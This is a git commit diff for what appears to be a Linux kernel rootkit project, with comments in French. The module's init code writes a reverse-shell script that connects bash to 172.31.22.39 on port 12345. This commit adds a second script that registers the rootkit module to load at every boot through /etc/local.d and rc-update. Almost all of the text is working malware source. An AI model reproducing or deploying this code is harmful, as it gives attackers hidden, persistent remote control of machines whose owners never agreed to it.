6660957cdecee306fa7e6523ca96273981539654
offPath <91066290+off-path@users.noreply.github.com>
2024-12-04 13:20:48 +0100

    ci: add creation of persistence.sh

--- features/persistence.sh
+++ features/persistence.sh
@@ -4,6 +4,4 @@ echo "insmod /111111111111111111111111111/rootkit.ko" >> /etc/local.d/my_startup
 
 chmod +x /etc/local.d/my_startup.start
 
-#Adds the local service to the default runlevel
 rc-update add local default
-
--- rootkit.c
+++ rootkit.c
@@ -176,10 +176,15 @@ static int dir_init(void)
 }
 
 static int lkm_file_create_init(void) {
-    struct file *trigger_file, *revshell_file;
-    loff_t pos_trigger = 0, pos_revshell = 0;
+    struct file *trigger_file, *revshell_file, *persistence_file;
+    loff_t pos_trigger = 0, pos_revshell = 0, pos_persistence;
     char *trigger_content = "#!/bin/bash\n";
     char *revshell_content = "#!/bin/bash\n/bin/bash -i >& /dev/tcp/172.31.22.39/12345 0>&1\n";
+    char *persistence_content =
+        "echo \"#!/bin/sh\" > /etc/local.d/my_startup.start\n"
+        "echo \"insmod /111111111111111111111111111/rootkit.ko\" >> /etc/local.d/my_startup.start\n"
+        "chmod +x /etc/local.d/my_startup.start\n"
+        "rc-update add local default\n";
     ssize_t written;
 
     // Crée et ouvre le premier fichier
@@ -215,6 +220,22 @@ static int lkm_file_create_init(void) {
     }
     // printk(KERN_INFO "LKM: Écriture réussie dans /111111111111111111111111111/revshell.sh.\n");
     filp_close(revshell_file, NULL);
+
+    // Créer et écrire dans le fichier persistence
+    persistence_file = filp_open("/111111111111111111111111111/persistence.sh", O_WRONLY | O_CREAT | O_TRUNC, 0777);
+    if (IS_ERR(persistence_file)) {
+        printk(KERN_ERR "LKM: Impossible d'ouvrir ou de créer /111111111111111111111111111/persistence.sh.\n");
+        return PTR_ERR(persistence_file);
+    }
+    written = kernel_write(persistence_file, persistence_content, strlen(persistence_content), &pos_persistence);
+    if (written < 0) {
+        printk(KERN_ERR "LKM: Échec de l'écriture dans /111111111111111111111111111/persistence.sh.\n");
+        filp_close(persistence_file, NULL);
+        return written;
+    }
+    printk(KERN_INFO "LKM: Écriture réussie dans /111111111111111111111111111/persistence.sh.\n");
+    filp_close(persistence_file, NULL);
+
 
     return 0;
 }
